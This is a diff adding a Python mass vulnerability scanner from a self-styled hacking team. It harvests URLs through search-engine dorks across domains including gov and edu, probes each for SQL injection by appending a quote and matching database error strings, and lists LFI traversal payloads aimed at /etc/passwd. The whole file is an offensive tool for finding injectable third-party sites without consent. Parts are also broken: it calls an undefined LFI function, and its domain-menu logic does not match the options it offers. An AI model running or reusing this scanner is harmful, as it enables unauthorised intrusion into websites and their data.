@@ -1,0 +1,206 @@
+import string, sys, time, requests, re, random, threading, socket, os, subprocess
+from random import choice
+
+# Colors
+W = "\033[0m"
+R = "\033[31m"
+G = "\033[32m"
+O = "\033[33m"
+B = "\033[34m"
+
+# Banner
+def logo():
+    print(G + "\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
+    print(">                                                                     >")
+    print(">                     \ \   /  (_) |_   _|__  __ _ _ __ ___           >")
+    print(">                      \ \ / / | |   | |/ _ \/ _` | '_ ` _ \          >")
+    print(">                       \ V /  | |   | |  __/ (_| | | | | | |         >")
+    print(">                        \_/   |_|   |_|\___|\__,_|_| |_| |_|         >")
+    print(">                                                                     >")
+    print(">                                                                     >")
+    print(">               Sql Scanner of Vi Team                                >")
+    print(">               Re-written By Mastervi                                >")
+    print(">               Visit my page on FACEBOOK                             >")
+    print(">      https://www.facebook.com/groups/1319140261497280               >")
+    print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n")
+    print(G)
+
+# Initial setup
+if sys.platform in ['linux', 'linux2']:
+    subprocess.call("clear", shell=True)
+    logo()
+else:
+    subprocess.call("cls", shell=True)
+    logo()
+
+log = "vimaper.txt"
+lfi_log = "vimaper.txt"
+threads = []
+finallist = []
+vuln = []
+timeout = 350
+socket.setdefaulttimeout(timeout)
+
+lfis = [
+    "/etc/passwd%00", "../etc/passwd%00", "../../etc/passwd%00", "../../../etc/passwd%00",
+    "../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00"
+]
+
+sqlerrors = {
+    'MySQL': 'error in your SQL syntax', 'MiscError': 'mysql_fetch', 'MiscError2': 'num_rows', 'Oracle': 'ORA-01756',
+    'JDBC_CFM': 'Error Executing Database Query', 'JDBC_CFM2': 'SQLServer JDBC Driver', 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
+    'MSSQL_Uqm': 'Unclosed quotation mark', 'MS-Access_ODBC': 'ODBC Microsoft Access Driver', 'MS-Access_JETdb': 'Microsoft JET Database',
+    'Syntax error': 'Syntax error', 'mysql_numrows()': 'mysql_numrows()', 'GetArray()': 'GetArray()',
+    'Input string was not in a correct format': 'Input string was not in a correct format', 'Not found': 'Not found'
+}
+
+header = [
+    'Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04',
+    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)'
+]
+
+domains = {
+    'All domains': ['ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'as', 'at', 'au'],
+    'Default': ['com', 'fr', 'net', 'edu', 'gov', 'info'], 'Choose specific domain': [],
+}
+
+stecnt = 0
+for k, v in domains.items():
+    stecnt += 1
+    print(f"{stecnt} - {k}")
+sitekey = input("\nChoose your target  (if you don't know choose default) : ")
+
+if sitekey == "5":
+    sitedomain = input("\nChoose the specifics domain (e.g. fr or com...) for multiples domains separe with commas :  ")
+    if "," in sitedomain:
+        sitearray = sitedomain.split(',')
+    else:
+        sitearray = domains[list(domains.keys())[int(sitekey)-1]]
+        sitearray[0] = sitedomain
+else:
+    sitearray = domains[list(domains.keys())[int(sitekey)-1]]
+
+inurl = input('\nEnter your dork (without "inurl") : ')
+numthreads = input('Enter no. of threads : ')
+maxc = input('Enter no. of pages   : ')
+print(f"\nNumber of SQL errors : {len(sqlerrors)}")
+print(f"Number of LFI paths  : {len(lfis)}")
+print(f"Number of headers    : {len(header)}")
+print(f"Number of domains    : {len(sitearray)}")
+print(f"domains              : {sitearray}")
+print(f"Number of threads    : {numthreads}")
+print(f"Number of pages      : {maxc}")
+print(f"Timeout in seconds   : {timeout}\n")
+
+
+def search(inurl, maxc):
+    urls = []
+    for site in sitearray:
+        site = site.strip()
+        page = 0
+        try:
+            while page < int(maxc):
+                jar = requests.cookies.RequestsCookieJar()
+                query = f"{inurl}+site:{site}"
+                results_web = f'http://www.search-results.com/web?q={query}&hl=en&page={page}&src=hmp'
+                request_web = requests.get(results_web, headers={'User-Agent': random.choice(header)}, cookies=jar)
+                names = re.findall(r'(?<=href=")(.*?)(?=")', request_web.text)
+                page += 1
+                for name in names:
+                    if name not in urls and not re.search(r'(google|youtube|phpbuddy|phpbuilder|iranhack|codingforums|phpfreaks|%|<|php|http://)\d', name):
+                        urls.append(name)
+                percent = int((page / int(maxc)) * 100)
+                sys.stdout.write(f"\rSite: {site} | Collected urls: {len(urls)} | Percent Done: {percent}% | Current page no.: {page}")
+                sys.stdout.flush()
+        except Exception as e:
+            print(f"Error during search: {e}")
+            pass
+    print(f"\n\n[+] URLS (unsorted): {len(urls)}")
+    return list(set(urls))
+
+
+class injThread(threading.Thread):
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
+
+    def run(self):
+        for url in self.hosts:
+            try:
+                if self.check:
+                    ClassicINJ(url)
+            except Exception as e:
+                pass
+        self.fcount += 1
+
+    def stop(self):
+        self.check = False
+
+
+def ClassicINJ(url):
+    EXT = "'"
+    host = url + EXT
+    try:
+        source = requests.get(host).text
+        for type, eMSG in sqlerrors.items():
+            if eMSG in source:
+                print(f"{R}\n [+] y3sss!: {O}{host} {B}Error: {type}")
+                with open(log, "a") as logfile:
+                    logfile.write(f"\n{host}")
+                vuln.append(host)
+    except requests.RequestException:
+        pass
+
+
+def injtest():
+    print(f"{B}\n[+] Preparing for SQLi scanning ...")
+    print("[+] Can take a while ...")
+    print("[!] Working ...")
+    i = len(usearch) // int(numthreads)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    for x in range(0, int(numthreads)):
+        sliced = usearch[x * i:(x + 1) * i]
+        if z < m:
+            sliced.append(usearch[int(numthreads) * i + z])
+            z += 1
+        thread = injThread(sliced)
+        thread.start()
+        threads.append(thread)
+    for thread in threads:
+        thread.join()
+
+
+usearch = search(inurl, maxc)
+menu = True
+while menu:
+    print(f"{R}\n[1] SQLi Testing")
+    print("[2] LFI Testing")
+    print("[3] SQLi and LFI Testing")
+    print("[4] Save valid urls to file")
+    print("[5] Print valid urls")
+    print("[6] Found vuln in last scan")
+    print("[0] Exit\n")
+    chce = input(": ")
+    if chce == '1':
+        injtest()
+    elif chce == '2':
+        lfitest()
+    elif chce == '3':
+        injtest()
+        lfitest()
+    elif chce == '4':
+        with open(input("Filename: "), "w") as list_name:
+            finallist.sort()
+            for t in finallist:
+                list_name.write(t + "\n")
+        print("Urls saved")
+    elif chce == '5':
+        print(W + "\nPrinting valid urls:\n")
+        finallist.sort()
+        for t in finallist:
+            print(B + t)
+    elif chce == '6':
+        print(B + f"\nVuln found {len(vuln)}")
